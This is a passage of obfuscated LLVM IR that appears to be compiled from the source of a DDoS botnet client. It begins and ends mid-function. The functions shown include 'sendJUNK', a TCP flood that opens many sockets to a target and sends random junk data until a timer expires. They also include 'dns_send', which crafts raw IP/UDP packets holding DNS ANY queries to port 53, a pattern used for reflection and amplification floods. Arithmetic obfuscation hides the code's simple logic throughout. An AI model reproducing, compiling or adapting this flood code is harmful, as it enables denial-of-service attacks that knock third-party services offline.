; <label>:298:                                    ; preds = %297
  %299 = load i32, i32* %8, align 4
  %300 = add i32 %299, 1419993114
  %301 = add i32 %300, 1
  %302 = sub i32 %301, 1419993114
  %303 = add nsw i32 %299, 1
  store i32 %302, i32* %8, align 4
  br label %59

; <label>:304:                                    ; preds = %59
  br label %53

; <label>:305:                                    ; preds = %53
  %306 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %306)
  br label %307

; <label>:307:                                    ; preds = %305, %33
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @realrand(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %5 = call i64 @time(i64* null) #2
  %6 = call i32 @getpid() #2
  %7 = sext i32 %6 to i64
  %8 = sub i64 0, %7
  %9 = sub i64 %5, %8
  %10 = add nsw i64 %5, %7
  %11 = trunc i64 %9 to i32
  call void @srand(i32 %11) #2
  %12 = call i32 @rand() #2
  %13 = load i32, i32* %4, align 4
  %14 = sub i32 0, %13
  %15 = sub i32 0, 1
  %16 = add i32 %14, %15
  %17 = sub i32 0, %16
  %18 = add nsw i32 %13, 1
  %19 = load i32, i32* %3, align 4
  %20 = sub i32 0, %19
  %21 = add i32 %17, %20
  %22 = sub nsw i32 %17, %19
  %23 = srem i32 %12, %21
  %24 = load i32, i32* %3, align 4
  %25 = sub i32 0, %24
  %26 = sub i32 %23, %25
  %27 = add nsw i32 %23, %24
  ret i32 %26
}

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind uwtable
define void @makeRandomShit(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = call i64 @time(i64* null) #2
  %7 = trunc i64 %6 to i32
  call void @srand(i32 %7) #2
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %8

; <label>:8:                                      ; preds = %25, %2
  %9 = load i32, i32* %5, align 4
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %9, %10
  br i1 %11, label %12, label %31

; <label>:12:                                     ; preds = %8
  %13 = call i32 @rand() #2
  %14 = srem i32 %13, 255
  %15 = sub i32 0, %14
  %16 = sub i32 0, 1
  %17 = add i32 %15, %16
  %18 = sub i32 0, %17
  %19 = add nsw i32 %14, 1
  %20 = trunc i32 %18 to i8
  %21 = load i8*, i8** %3, align 8
  %22 = load i32, i32* %5, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds i8, i8* %21, i64 %23
  store i8 %20, i8* %24, align 1
  br label %25

; <label>:25:                                     ; preds = %12
  %26 = load i32, i32* %5, align 4
  %27 = add i32 %26, 185120663
  %28 = add i32 %27, 1
  %29 = sub i32 %28, 185120663
  %30 = add nsw i32 %26, 1
  store i32 %29, i32* %5, align 4
  br label %8

; <label>:31:                                     ; preds = %8
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %3
  br label %278

; <label>:34:                                     ; preds = %3
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %36 = getelementptr inbounds [8 x i8], [8 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 8, i32 4, i1 false)
  %37 = load i32, i32* %7, align 4
  %38 = zext i32 %37 to i64
  %39 = call i8* @llvm.stacksave()
  store i8* %39, i8** %10, align 8
  %40 = alloca %struct.state_t, i64 %38, align 16
  %41 = bitcast %struct.state_t* %40 to i8*
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = mul i64 %43, 5
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 %44, i32 16, i1 false)
  %45 = call noalias i8* @malloc(i64 1024) #2
  store i8* %45, i8** %16, align 8
  %46 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 1024, i32 1, i1 false)
  store i32 1024, i32* %17, align 4
  %47 = call i64 @time(i64* null) #2
  %48 = load i32, i32* %6, align 4
  %49 = sext i32 %48 to i64
  %50 = add i64 %47, -445962261215175712
  %51 = add i64 %50, %49
  %52 = sub i64 %51, -445962261215175712
  %53 = add nsw i64 %47, %49
  %54 = trunc i64 %52 to i32
  store i32 %54, i32* %18, align 4
  br label %55

; <label>:55:                                     ; preds = %275, %34
  %56 = load i32, i32* %18, align 4
  %57 = sext i32 %56 to i64
  %58 = call i64 @time(i64* null) #2
  %59 = icmp sgt i64 %57, %58
  br i1 %59, label %60, label %276

; <label>:60:                                     ; preds = %55
  store i32 0, i32* %8, align 4
  br label %61

; <label>:61:                                     ; preds = %268, %60
  %62 = load i32, i32* %8, align 4
  %63 = load i32, i32* %7, align 4
  %64 = icmp slt i32 %62, %63
  br i1 %64, label %65, label %275

; <label>:65:                                     ; preds = %61
  %66 = load i32, i32* %8, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %67
  %69 = getelementptr inbounds %struct.state_t, %struct.state_t* %68, i32 0, i32 1
  %70 = load i8, i8* %69, align 4
  %71 = zext i8 %70 to i32
  switch i32 %71, label %267 [
    i32 0, label %72
    i32 1, label %134
    i32 2, label %237
  ]

; <label>:72:                                     ; preds = %65
  %73 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %74 = load i32, i32* %8, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %75
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %76, i32 0, i32 0
  store i32 %73, i32* %77, align 8
  %78 = load i32, i32* %8, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %79
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %80, i32 0, i32 0
  %82 = load i32, i32* %81, align 8
  %83 = load i32, i32* %8, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %84
  %86 = getelementptr inbounds %struct.state_t, %struct.state_t* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 8
  %88 = call i32 (i32, i32, ...) @fcntl(i32 %87, i32 3, i8* null)
  %89 = xor i32 %88, -1
  %90 = xor i32 2048, -1
  %91 = xor i32 220954348, -1
  %92 = and i32 %89, 220954348
  %93 = and i32 %88, %91
  %94 = and i32 %90, 220954348
  %95 = and i32 2048, %91
  %96 = or i32 %92, %93
  %97 = or i32 %94, %95
  %98 = xor i32 %96, %97
  %99 = or i32 %89, %90
  %100 = xor i32 %99, -1
  %101 = or i32 220954348, %91
  %102 = and i32 %100, %101
  %103 = or i32 %98, %102
  %104 = or i32 %88, 2048
  %105 = call i32 (i32, i32, ...) @fcntl(i32 %82, i32 4, i32 %103)
  %106 = load i32, i32* %8, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %107
  %109 = getelementptr inbounds %struct.state_t, %struct.state_t* %108, i32 0, i32 0
  %110 = load i32, i32* %109, align 8
  %111 = bitcast %union.__CONST_SOCKADDR_ARG* %19 to %struct.sockaddr**
  %112 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %112, %struct.sockaddr** %111, align 8
  %113 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %19, i32 0, i32 0
  %114 = load %struct.sockaddr*, %struct.sockaddr** %113, align 8
  %115 = call i32 @connect(i32 %110, %struct.sockaddr* %114, i32 16)
  %116 = icmp ne i32 %115, -1
  br i1 %116, label %121, label %117

; <label>:117:                                    ; preds = %72
  %118 = call i32* @__errno_location() #13
  %119 = load i32, i32* %118, align 4
  %120 = icmp ne i32 %119, 115
  br i1 %120, label %121, label %128

; <label>:121:                                    ; preds = %117, %72
  %122 = load i32, i32* %8, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %123
  %125 = getelementptr inbounds %struct.state_t, %struct.state_t* %124, i32 0, i32 0
  %126 = load i32, i32* %125, align 8
  %127 = call i32 @close(i32 %126)
  br label %133

; <label>:128:                                    ; preds = %117
  %129 = load i32, i32* %8, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %130
  %132 = getelementptr inbounds %struct.state_t, %struct.state_t* %131, i32 0, i32 1
  store i8 1, i8* %132, align 4
  br label %133

; <label>:133:                                    ; preds = %128, %121
  br label %267

; <label>:134:                                    ; preds = %65
  br label %135

; <label>:135:                                    ; preds = %134
  %136 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %137 = getelementptr inbounds [16 x i64], [16 x i64]* %136, i64 0, i64 0
  %138 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %137) #2, !srcloc !9
  %139 = extractvalue { i64, i64* } %138, 0
  %140 = extractvalue { i64, i64* } %138, 1
  %141 = trunc i64 %139 to i32
  store i32 %141, i32* %20, align 4
  %142 = ptrtoint i64* %140 to i64
  %143 = trunc i64 %142 to i32
  store i32 %143, i32* %21, align 4
  br label %144

; <label>:144:                                    ; preds = %135
  br label %145

; <label>:145:                                    ; preds = %144
  %146 = load i32, i32* %8, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %147
  %149 = getelementptr inbounds %struct.state_t, %struct.state_t* %148, i32 0, i32 0
  %150 = load i32, i32* %149, align 8
  %151 = srem i32 %150, 64
  %152 = zext i32 %151 to i64
  %153 = shl i64 1, %152
  %154 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %155 = load i32, i32* %8, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %156
  %158 = getelementptr inbounds %struct.state_t, %struct.state_t* %157, i32 0, i32 0
  %159 = load i32, i32* %158, align 8
  %160 = sdiv i32 %159, 64
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds [16 x i64], [16 x i64]* %154, i64 0, i64 %161
  %163 = load i64, i64* %162, align 8
  %164 = xor i64 %163, -1
  %165 = xor i64 %153, -1
  %166 = xor i64 6212784247006504739, -1
  %167 = and i64 %164, 6212784247006504739
  %168 = and i64 %163, %166
  %169 = and i64 %165, 6212784247006504739
  %170 = and i64 %153, %166
  %171 = or i64 %167, %168
  %172 = or i64 %169, %170
  %173 = xor i64 %171, %172
  %174 = or i64 %164, %165
  %175 = xor i64 %174, -1
  %176 = or i64 6212784247006504739, %166
  %177 = and i64 %175, %176
  %178 = or i64 %173, %177
  %179 = or i64 %163, %153
  store i64 %178, i64* %162, align 8
  %180 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %180, align 8
  %181 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %181, align 8
  %182 = load i32, i32* %8, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %183
  %185 = getelementptr inbounds %struct.state_t, %struct.state_t* %184, i32 0, i32 0
  %186 = load i32, i32* %185, align 8
  %187 = add i32 %186, 1551477754
  %188 = add i32 %187, 1
  %189 = sub i32 %188, 1551477754
  %190 = add nsw i32 %186, 1
  %191 = call i32 @select(i32 %189, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %191, i32* %15, align 4
  %192 = load i32, i32* %15, align 4
  %193 = icmp eq i32 %192, 1
  br i1 %193, label %194, label %221

; <label>:194:                                    ; preds = %145
  store i32 4, i32* %13, align 4
  %195 = load i32, i32* %8, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %196
  %198 = getelementptr inbounds %struct.state_t, %struct.state_t* %197, i32 0, i32 0
  %199 = load i32, i32* %198, align 8
  %200 = bitcast i32* %14 to i8*
  %201 = call i32 @getsockopt(i32 %199, i32 1, i32 4, i8* %200, i32* %13) #2
  %202 = load i32, i32* %14, align 4
  %203 = icmp ne i32 %202, 0
  br i1 %203, label %204, label %215

; <label>:204:                                    ; preds = %194
  %205 = load i32, i32* %8, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %206
  %208 = getelementptr inbounds %struct.state_t, %struct.state_t* %207, i32 0, i32 0
  %209 = load i32, i32* %208, align 8
  %210 = call i32 @close(i32 %209)
  %211 = load i32, i32* %8, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %212
  %214 = getelementptr inbounds %struct.state_t, %struct.state_t* %213, i32 0, i32 1
  store i8 0, i8* %214, align 4
  br label %220

; <label>:215:                                    ; preds = %194
  %216 = load i32, i32* %8, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %217
  %219 = getelementptr inbounds %struct.state_t, %struct.state_t* %218, i32 0, i32 1
  store i8 2, i8* %219, align 4
  br label %220

; <label>:220:                                    ; preds = %215, %204
  br label %236

; <label>:221:                                    ; preds = %145
  %222 = load i32, i32* %15, align 4
  %223 = icmp eq i32 %222, -1
  br i1 %223, label %224, label %235

; <label>:224:                                    ; preds = %221
  %225 = load i32, i32* %8, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %226
  %228 = getelementptr inbounds %struct.state_t, %struct.state_t* %227, i32 0, i32 0
  %229 = load i32, i32* %228, align 8
  %230 = call i32 @close(i32 %229)
  %231 = load i32, i32* %8, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %232
  %234 = getelementptr inbounds %struct.state_t, %struct.state_t* %233, i32 0, i32 1
  store i8 0, i8* %234, align 4
  br label %235

; <label>:235:                                    ; preds = %224, %221
  br label %236

; <label>:236:                                    ; preds = %235, %220
  br label %267

; <label>:237:                                    ; preds = %65
  %238 = call i32 @realrand(i32 32, i32 1024)
  store i32 %238, i32* %17, align 4
  %239 = load i8*, i8** %16, align 8
  %240 = load i32, i32* %17, align 4
  call void @makeRandomShit(i8* %239, i32 %240)
  %241 = load i32, i32* %8, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %242
  %244 = getelementptr inbounds %struct.state_t, %struct.state_t* %243, i32 0, i32 0
  %245 = load i32, i32* %244, align 8
  %246 = load i8*, i8** %16, align 8
  %247 = load i32, i32* %17, align 4
  %248 = sext i32 %247 to i64
  %249 = call i64 @send(i32 %245, i8* %246, i64 %248, i32 16384)
  %250 = icmp eq i64 %249, -1
  br i1 %250, label %251, label %266

; <label>:251:                                    ; preds = %237
  %252 = call i32* @__errno_location() #13
  %253 = load i32, i32* %252, align 4
  %254 = icmp ne i32 %253, 11
  br i1 %254, label %255, label %266

; <label>:255:                                    ; preds = %251
  %256 = load i32, i32* %8, align 4
  %257 = sext i32 %256 to i64
  %258 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %257
  %259 = getelementptr inbounds %struct.state_t, %struct.state_t* %258, i32 0, i32 0
  %260 = load i32, i32* %259, align 8
  %261 = call i32 @close(i32 %260)
  %262 = load i32, i32* %8, align 4
  %263 = sext i32 %262 to i64
  %264 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %263
  %265 = getelementptr inbounds %struct.state_t, %struct.state_t* %264, i32 0, i32 1
  store i8 0, i8* %265, align 4
  br label %266

; <label>:266:                                    ; preds = %255, %251, %237
  br label %267

; <label>:267:                                    ; preds = %266, %236, %133, %65
  br label %268

; <label>:268:                                    ; preds = %267
  %269 = load i32, i32* %8, align 4
  %270 = sub i32 0, %269
  %271 = sub i32 0, 1
  %272 = add i32 %270, %271
  %273 = sub i32 0, %272
  %274 = add nsw i32 %269, 1
  store i32 %273, i32* %8, align 4
  br label %61

; <label>:275:                                    ; preds = %61
  br label %55

; <label>:276:                                    ; preds = %55
  %277 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %277)
  br label %278

; <label>:278:                                    ; preds = %276, %33
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @dns_format(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  store i32 0, i32* %5, align 4
  %7 = load i8*, i8** %4, align 8
  %8 = call i8* @strcat(i8* %7, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #2
  store i32 0, i32* %6, align 4
  br label %9

; <label>:9:                                      ; preds = %60, %2
  %10 = load i32, i32* %6, align 4
  %11 = sext i32 %10 to i64
  %12 = load i8*, i8** %4, align 8
  %13 = call i64 @strlen(i8* %12) #10
  %14 = icmp ult i64 %11, %13
  br i1 %14, label %15, label %66

; <label>:15:                                     ; preds = %9
  %16 = load i8*, i8** %4, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 46
  br i1 %22, label %23, label %59

; <label>:23:                                     ; preds = %15
  %24 = load i32, i32* %6, align 4
  %25 = load i32, i32* %5, align 4
  %26 = sub i32 %24, 21190655
  %27 = sub i32 %26, %25
  %28 = add i32 %27, 21190655
  %29 = sub nsw i32 %24, %25
  %30 = trunc i32 %28 to i8
  %31 = load i8*, i8** %3, align 8
  %32 = getelementptr inbounds i8, i8* %31, i32 1
  store i8* %32, i8** %3, align 8
  store i8 %30, i8* %31, align 1
  br label %33

; <label>:33:                                     ; preds = %45, %23
  %34 = load i32, i32* %5, align 4
  %35 = load i32, i32* %6, align 4
  %36 = icmp slt i32 %34, %35
  br i1 %36, label %37, label %52

; <label>:37:                                     ; preds = %33
  %38 = load i8*, i8** %4, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i8, i8* %41, align 1
  %43 = load i8*, i8** %3, align 8
  %44 = getelementptr inbounds i8, i8* %43, i32 1
  store i8* %44, i8** %3, align 8
  store i8 %42, i8* %43, align 1
  br label %45

; <label>:45:                                     ; preds = %37
  %46 = load i32, i32* %5, align 4
  %47 = sub i32 0, %46
  %48 = sub i32 0, 1
  %49 = add i32 %47, %48
  %50 = sub i32 0, %49
  %51 = add nsw i32 %46, 1
  store i32 %50, i32* %5, align 4
  br label %33

; <label>:52:                                     ; preds = %33
  %53 = load i32, i32* %5, align 4
  %54 = sub i32 0, %53
  %55 = sub i32 0, 1
  %56 = add i32 %54, %55
  %57 = sub i32 0, %56
  %58 = add nsw i32 %53, 1
  store i32 %57, i32* %5, align 4
  br label %59

; <label>:59:                                     ; preds = %52, %15
  br label %60

; <label>:60:                                     ; preds = %59
  %61 = load i32, i32* %6, align 4
  %62 = add i32 %61, -1164292984
  %63 = add i32 %62, 1
  %64 = sub i32 %63, -1164292984
  %65 = add nsw i32 %61, 1
  store i32 %64, i32* %6, align 4
  br label %9

; <label>:66:                                     ; preds = %9
  %67 = load i8*, i8** %3, align 8
  %68 = getelementptr inbounds i8, i8* %67, i32 1
  store i8* %68, i8** %3, align 8
  store i8 0, i8* %67, align 1
  ret void
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @dns_hdr_create(%struct.dns_hdr*) #0 {
  %2 = alloca %struct.dns_hdr*, align 8
  store %struct.dns_hdr* %0, %struct.dns_hdr** %2, align 8
  %3 = call i32 @getpid() #2
  %4 = trunc i32 %3 to i16
  %5 = call zeroext i16 @htons(i16 zeroext %4) #13
  %6 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %7 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %6, i32 0, i32 0
  store i16 %5, i16* %7, align 2
  %8 = call zeroext i16 @htons(i16 zeroext 256) #13
  %9 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %10 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %9, i32 0, i32 1
  store i16 %8, i16* %10, align 2
  %11 = call zeroext i16 @htons(i16 zeroext 1) #13
  %12 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %13 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %12, i32 0, i32 2
  store i16 %11, i16* %13, align 2
  %14 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %15 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %14, i32 0, i32 3
  store i16 0, i16* %15, align 2
  %16 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %17 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %16, i32 0, i32 4
  store i16 0, i16* %17, align 2
  %18 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %19 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %18, i32 0, i32 5
  store i16 0, i16* %19, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @dns_send(i8*, i32, i8*, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca [128 x i8], align 16
  %10 = alloca %struct.dns_hdr*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca [32 x i8], align 16
  %13 = alloca %struct.query*, align 8
  %14 = alloca [4096 x i8], align 16
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca %struct.iphdr*, align 8
  %19 = alloca %struct.udphdr*, align 8
  %20 = alloca %struct.ps_hdr, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  store i8* %3, i8** %8, align 8
  %24 = bitcast [128 x i8]* %9 to %struct.dns_hdr*
  store %struct.dns_hdr* %24, %struct.dns_hdr** %10, align 8
  %25 = load %struct.dns_hdr*, %struct.dns_hdr** %10, align 8
  call void @dns_hdr_create(%struct.dns_hdr* %25)
  %26 = getelementptr inbounds [128 x i8], [128 x i8]* %9, i64 0, i64 12
  store i8* %26, i8** %11, align 8
  %27 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i32 0, i32 0
  %28 = load i8*, i8** %8, align 8
  %29 = call i8* @strcpy(i8* %27, i8* %28) #2
  %30 = load i8*, i8** %11, align 8
  %31 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i32 0, i32 0
  call void @dns_format(i8* %30, i8* %31)
  %32 = load i8*, i8** %11, align 8
  %33 = call i64 @strlen(i8* %32) #10
  %34 = sub i64 0, 1
  %35 = sub i64 %33, %34
  %36 = add i64 %33, 1
  %37 = sub i64 0, %35
  %38 = sub i64 12, %37
  %39 = add i64 12, %35
  %40 = getelementptr inbounds [128 x i8], [128 x i8]* %9, i64 0, i64 %38
  %41 = bitcast i8* %40 to %struct.query*
  store %struct.query* %41, %struct.query** %13, align 8
  %42 = call zeroext i16 @htons(i16 zeroext 255) #13
  %43 = load %struct.query*, %struct.query** %13, align 8
  %44 = getelementptr inbounds %struct.query, %struct.query* %43, i32 0, i32 0
  store i16 %42, i16* %44, align 2
  %45 = call zeroext i16 @htons(i16 zeroext 1) #13
  %46 = load %struct.query*, %struct.query** %13, align 8
  %47 = getelementptr inbounds %struct.query, %struct.query* %46, i32 0, i32 1
  store i16 %45, i16* %47, align 2
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 4096, i32 16, i1 false)
  %49 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %50 = getelementptr inbounds i8, i8* %49, i64 20
  %51 = getelementptr inbounds i8, i8* %50, i64 8
  store i8* %51, i8** %15, align 8
  %52 = load i8*, i8** %15, align 8
  %53 = bitcast [128 x i8]* %9 to i8*
  %54 = load i8*, i8** %11, align 8
  %55 = call i64 @strlen(i8* %54) #10
  %56 = sub i64 0, %55
  %57 = sub i64 0, 1
  %58 = add i64 %56, %57
  %59 = sub i64 0, %58
  %60 = add i64 %55, 1
  %61 = sub i64 0, %59
  %62 = sub i64 12, %61
  %63 = add i64 12, %59
  %64 = sub i64 0, 4
  %65 = sub i64 %62, %64
  %66 = add i64 %62, 4
  %67 = sub i64 0, 1
  %68 = sub i64 %65, %67
  %69 = add i64 %65, 1
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %52, i8* %53, i64 %68, i32 1, i1 false)
  %70 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %70, align 4
  %71 = call zeroext i16 @htons(i16 zeroext 53) #13
  %72 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %71, i16* %72, align 2
  %73 = load i8*, i8** %7, align 8
  %74 = call i32 @inet_addr(i8* %73) #2
  %75 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %76 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %75, i32 0, i32 0
  store i32 %74, i32* %76, align 4
  %77 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %78 = bitcast i8* %77 to %struct.iphdr*
  store %struct.iphdr* %78, %struct.iphdr** %18, align 8
  %79 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %80 = bitcast %struct.iphdr* %79 to i8*
  %81 = load i8, i8* %80, align 4
  %82 = xor i8 15, -1
  %83 = xor i8 %81, %82
  %84 = and i8 %83, %81
  %85 = and i8 %81, 15
  %86 = and i8 %84, 64
  %87 = xor i8 %84, 64
  %88 = or i8 %86, %87
  %89 = or i8 %84, 64
  store i8 %88, i8* %80, align 4
  %90 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %91 = bitcast %struct.iphdr* %90 to i8*
  %92 = load i8, i8* %91, align 4
  %93 = xor i8 -16, -1
  %94 = xor i8 %92, %93
  %95 = and i8 %94, %92
  %96 = and i8 %92, -16
  %97 = xor i8 %95, -1
  %98 = xor i8 5, -1
  %99 = xor i8 -1, -1
  %100 = and i8 %97, -1
  %101 = and i8 %95, %99
  %102 = and i8 %98, -1
  %103 = and i8 5, %99
  %104 = or i8 %100, %101
  %105 = or i8 %102, %103
  %106 = xor i8 %104, %105
  %107 = or i8 %97, %98
  %108 = xor i8 %107, -1
  %109 = or i8 -1, %99
  %110 = and i8 %108, %109
  %111 = or i8 %106, %110
  %112 = or i8 %95, 5
  store i8 %111, i8* %91, align 4
  %113 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i32 0, i32 1
  store i8 0, i8* %114, align 1
  %115 = load i8*, i8** %11, align 8
  %116 = call i64 @strlen(i8* %115) #10
  %117 = add i64 %116, 1957915100136863030
  %118 = add i64 %117, 1
  %119 = sub i64 %118, 1957915100136863030
  %120 = add i64 %116, 1
  %121 = sub i64 0, %119
  %122 = sub i64 40, %121
  %123 = add i64 40, %119
  %124 = sub i64 0, 4
  %125 = sub i64 %122, %124
  %126 = add i64 %122, 4
  %127 = trunc i64 %125 to i16
  %128 = load %struct.iphdr*, %struct.iphdr** %18, align 8
